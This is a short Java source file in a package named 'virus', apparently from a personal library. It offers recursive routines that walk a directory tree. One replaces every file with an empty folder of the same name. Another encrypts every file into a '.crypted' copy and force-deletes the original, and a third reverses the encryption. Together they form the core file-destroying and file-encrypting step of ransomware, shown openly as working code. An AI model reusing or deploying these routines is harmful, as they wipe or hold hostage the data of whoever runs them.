/**
* Copyright (c) 2016 Marco Velluto. All rights reserved.
 */
package it.reexon.lib.virus;

import java.io.File;
import java.io.IOException;

import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import it.reexon.lib.files.FileUtils;
import it.reexon.lib.security.CryptoUtils;


/**
 * @author Marco Velluto
 * @since Java 1.8
 */
public class FileManipulations
{
    private static final Logger logger = LogManager.getLogger(FileManipulations.class);

    public static void fileToFolder(File file)
    {
        if (file.isFile())
        {
            File newDirectory = new File(file.getAbsolutePath());
            try
            {
                logger.debug("File Deleted: {}", file.getAbsolutePath());
                FileUtils.forceDelete(file);
            }
            catch (IOException e)
            {
                logger.warn("File {} doesn't deleted because: {}", e);
            }
            newDirectory.mkdirs();
        }
        else
        {
            for (File fileToFolder : file.listFiles())
                fileToFolder(fileToFolder);
        }
    }

    public static void fileEncrypted(File file)
    {
        if (file.isFile())
        {
            try
            {
                File outFile = new File(file.getAbsolutePath() + ".crypted");
                outFile.createNewFile();
                CryptoUtils.encrypt(file, outFile);
                logger.debug("File Encrypted: {}", file.getAbsolutePath());
                FileUtils.forceDelete(file);
            }
            catch (Exception e)
            {
                logger.warn("File {} doesn't deleted because: {}", e);
            }
        }
        else
        {
            for (File fileToFolder : file.listFiles())
                fileEncrypted(fileToFolder);
        }
    }

    public static void fileDecrypted(File file)
    {
        if (file.isFile())
        {
            try
            {
                File outFile = new File(StringUtils.substringBeforeLast(file.getAbsolutePath(), ".crypted"));
                outFile.createNewFile();
                CryptoUtils.decrypt(file, outFile);
                logger.debug("File Decrypted: {}", file.getAbsolutePath());
                FileUtils.forceDelete(file);
            }
            catch (@SuppressWarnings("unused") Exception e)
            {}
            logger.debug("File Crypted: {}", file.getAbsolutePath());
        }
        else
        {
            for (File fileToFolder : file.listFiles())
                fileDecrypted(fileToFolder);
        }
    }
}
